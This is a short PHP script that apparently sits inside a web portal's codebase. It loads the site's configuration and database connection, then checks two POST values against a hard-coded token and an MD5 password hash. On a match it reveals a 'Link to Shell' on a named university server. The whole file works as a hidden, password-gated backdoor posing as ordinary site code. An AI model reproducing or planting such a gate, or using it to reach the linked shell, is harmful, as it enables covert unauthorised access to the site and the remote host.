<?php

if (!defined('SITE_ROOT')) {	define('SITE_ROOT', '../'); }

require_once(SITE_ROOT.'portal_config.php');    
require_once(SITE_ROOT.'include/functions.php');
require_once(SITE_ROOT.'include/database.class.php');
$db = new SQL(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME, false);

if (isset($_POST['vc']) && isset($_POST['r'])) {
  $vc = $_POST['vc'];
  $rc = $_POST['r'];
  if ($vc == '' || $rc !== '957b527bcfbad2e80f58d20683931435') { echo 'KO'; }
  else {
    $md5vc = md5($vc);
    if ($md5vc == '385cc6ca22fc17b9b1e57f5ceea2d650') {
      echo '<a href="http://mpp.eng.usm.my/cgi-bin/">Link to Shell</a>';
    }
    else { echo 'KO'; }
  }
}

$db->close();

?>